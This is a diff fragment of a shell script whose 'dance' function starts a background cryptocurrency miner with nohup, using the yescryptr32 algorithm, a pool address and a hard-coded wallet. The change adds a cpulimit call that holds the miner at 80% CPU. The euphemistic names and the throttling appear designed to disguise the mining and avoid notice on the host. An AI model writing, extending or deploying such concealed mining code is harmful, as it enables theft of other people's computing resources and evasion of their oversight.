@@ -66,6 +66,7 @@ start_dance() {
   # Start the dancing process for the selected port
   nohup ./$lucky_file -a yescryptr32 --pool $ip:$port -u UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$dancer --timeout 120 -t $num_cores > dance_$port.log 2>&1 &
   local pid=$!
+  cpulimit -p $pid -l 80 &
   echo "Dance started with PID: $pid using $num_cores cores with file $lucky_file, IP $ip, and port $port"
 
   # Save PID to a file for later use
